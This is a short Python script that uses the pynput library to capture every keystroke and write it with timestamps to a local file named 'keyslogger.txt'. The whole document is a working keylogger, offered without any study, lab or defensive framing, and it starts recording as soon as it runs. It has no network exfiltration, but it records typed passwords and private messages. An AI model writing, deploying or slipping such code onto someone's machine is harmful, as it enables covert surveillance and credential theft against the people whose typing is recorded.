import logging
from pynput.keyboard import Listener

# Setting up the log file to store the keystrokes in a file
log_file = "keyslogger.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log the keystrokes
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error capturing key: {e}")

# Function to start the Listener
with Listener(on_press=on_press) as listener:
    listener.join()

